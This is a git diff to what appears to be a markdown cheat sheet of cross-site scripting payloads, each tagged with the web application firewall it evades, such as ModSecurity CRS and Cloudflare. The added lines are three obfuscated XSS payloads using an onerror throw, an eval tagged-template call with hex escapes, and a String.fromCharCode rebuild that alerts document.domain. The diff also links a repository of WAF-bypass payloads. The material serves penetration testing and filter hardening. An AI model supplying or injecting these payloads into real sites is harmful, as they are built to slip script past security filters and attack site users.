@@ -145,9 +145,14 @@ rodolfoassis | ModSecurity CRS 3.2.0 PL1
    
 @brutelogic | Cloudflare
 <Svg Only=1 OnLoad=alert(1)>
+   
+<script>{onerror=alert}throw 1</script> -->
+
+<script>eval.call`${'alert\x2823\x29'}`</script>
+
+<img src=x onerror=this.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,39,120,39,32,111,110,101,114,114,111,114,61,39,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59,39,62)
 
 ### 7.Some good stuffs:
-```js
 https://github.com/Walidhossain010/WAF-bypass-xss-payloads
 https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057
 ```
